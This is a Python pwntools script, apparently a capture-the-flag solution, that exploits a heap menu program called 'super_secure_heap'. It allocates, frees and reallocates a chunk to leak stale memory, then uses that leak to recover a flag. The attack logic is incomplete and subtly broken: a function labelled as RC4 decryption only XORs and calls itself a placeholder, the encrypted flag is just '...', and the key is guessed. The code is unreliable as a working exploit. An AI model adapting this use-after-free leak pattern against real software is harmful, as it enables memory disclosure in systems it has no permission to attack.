from pwn import *

# Set up the process
p = process('./super_secure_heap')

# Function to add a chunk of memory
def add_chunk(size):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(size))

# Function to free a chunk of memory
def free_chunk(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(index))

# Function to leak a chunk of memory
def leak_chunk(index):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(index))
    p.recvuntil(': ')
    leak = p.recvline().strip()
    return leak

# Function to decrypt the flag
def decrypt_flag(key, encrypted_flag):
    # Implement the RC4 decryption here
    # This is a placeholder for the actual decryption logic
    decrypted_flag = ''
    for i in range(len(encrypted_flag)):
        decrypted_flag += chr(ord(encrypted_flag[i]) ^ ord(key[i % len(key)]))
    return decrypted_flag

# Add a chunk of memory
add_chunk(0x100)

# Free the chunk of memory
free_chunk(0)

# Add a new chunk of memory
add_chunk(0x100)

# Leak the old data from the freed chunk
leaked_data = leak_chunk(0)

# Decrypt the flag using the leaked data
encrypted_flag = '...'  # Replace with the actual encrypted flag
key = leaked_data  # The leaked data is likely the key
flag = decrypt_flag(key, encrypted_flag)

# Print the flag
print(flag)

# Close the process
p.close()